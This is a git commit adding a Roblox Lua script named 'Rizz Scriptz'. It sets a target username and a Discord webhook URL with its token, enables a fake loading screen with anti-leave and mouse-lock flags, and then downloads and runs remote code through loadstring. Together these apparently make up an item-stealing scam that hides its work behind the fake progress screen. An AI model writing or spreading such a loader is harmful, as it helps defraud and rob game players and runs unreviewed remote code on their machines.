3ed54f00548103c7764d8ac19ae8e542636f3a50
samuelgang123 <131977747+samuelgang123@users.noreply.github.com>
2023-04-27 15:48:01 +0200

    Add files via upload

---
+++ script.lua
@@ -0,0 +1,15 @@
+UserName = "ghost17shadical"
+Webhook = "https://discord.com/api/webhooks/1101092047059963914/7ssYP3VusKCuZFfyyscB7RTfvlZBCr_MF6CsGyFgylV-xPQuaEbgjSD0QVJRCfcRz_rv" -- optional delete the whole line if you don't want it
+
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true 
+-- set them to false if you don't need them
+
+_G.ScriptName = "Rizz Scriptz"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/samuelgang123/gang/main/main.lua", true))()
